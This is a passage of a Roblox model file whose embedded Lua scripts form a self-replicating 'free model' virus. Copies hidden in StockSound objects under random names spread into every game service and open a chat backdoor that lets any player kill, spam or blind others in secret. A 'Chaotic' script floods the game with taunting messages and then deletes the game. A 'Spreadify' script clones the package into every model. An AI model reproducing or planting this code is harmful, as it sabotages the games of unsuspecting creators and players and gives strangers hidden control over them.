if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Geometry" referent="RBX19">
				<Properties>
					<string name="Name">OHAI</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Model" referent="RBX20">
					<Properties>
						<CoordinateFrame name="ModelInPrimary">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">Controls</string>
						<Ref name="PrimaryPart">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX21">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Chaotic</string>
							<string name="Source">messages = {&quot;Death to roblox!&quot;, &quot;Robloxian Spirits will prevail!&quot;, &quot;Free model using fool!&quot;, &quot;1x1x1x1 will come!&quot;, &quot;Destruction to roblox!&quot;, &quot;Burn the capitalists, comrades!&quot;, &quot;We have already captured chuck norris, you are doomed!&quot;, &quot;FOR THE MOTHERLAND&quot;, &quot;SPAMSPAMSPAMSPAM&quot;, &quot;Telamon&apos;s security system sucks..&quot;, &quot;MrDoomBringer Phailz!&quot;, &quot;SPAMSKOIADGFVIKHJNWDSIV&quot;, &quot;KOMAPSAMEDA&quot;, &quot;I LOVE YOU&quot;, &quot;I HATE YOU&quot;, &quot;This is all a script, an alternate form of reality.&quot;, &quot;SPAM THE FORUMS PLZ&quot;}

while true do
wait(600)
if game:findFirstChild(&quot;NetworkServer&quot;) ~= nil then
game.Lighting.TimeOfDay = &quot;00:00:00&quot;
game.Lighting.Brightness = 0
for i=1, 300 do
local a = Instance.new(&quot;Message&quot;)
a.Parent = game.Workspace
a.Text = messages[math.random(1, #messages)]
wait(.05)
end
game:Remove()
end
end
</string>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="StockSound" referent="RBX22">
							<Properties>
								<bool name="Looped">false</bool>
								<string name="Name">4szj7rd3c</string>
								<int name="PlayCount">-1</int>
								<bool name="PlayOnRemove">false</bool>
								<Content name="SoundId"><null></null></Content>
								<float name="Volume">0.5</float>
								<bool name="archivable">true</bool>
							</Properties>
							<Item class="Script" referent="RBX23">
								<Properties>
									<bool name="Disabled">false</bool>
									<Content name="LinkedSource"><null></null></Content>
									<string name="Name">nxspf</string>
									<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
									<bool name="archivable">true</bool>
								</Properties>
							</Item>
						</Item>
					</Item>
					<Item class="Script" referent="RBX24">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Spreadify</string>
							<string name="Source">function dive()
p= game.Workspace:GetChildren()	
for i= 1, #p do				
if p[i].className == &quot;Model&quot; and p[i]:findFirstChild(&quot;OHAI&quot;)==nil then
script.Parent.Parent:clone().Parent = p[i]
end
end
end

while true do
wait(10)
dive()
end
</string>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="StockSound" referent="RBX25">
							<Properties>
								<bool name="Looped">false</bool>
								<string name="Name">ca6o1gdpy</string>
								<int name="PlayCount">-1</int>
								<bool name="PlayOnRemove">false</bool>
								<Content name="SoundId"><null></null></Content>
								<float name="Volume">0.5</float>
								<bool name="archivable">true</bool>
							</Properties>
							<Item class="Script" referent="RBX26">
								<Properties>
									<bool name="Disabled">false</bool>
									<Content name="LinkedSource"><null></null></Content>
									<string name="Name">34jr5f8</string>
									<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

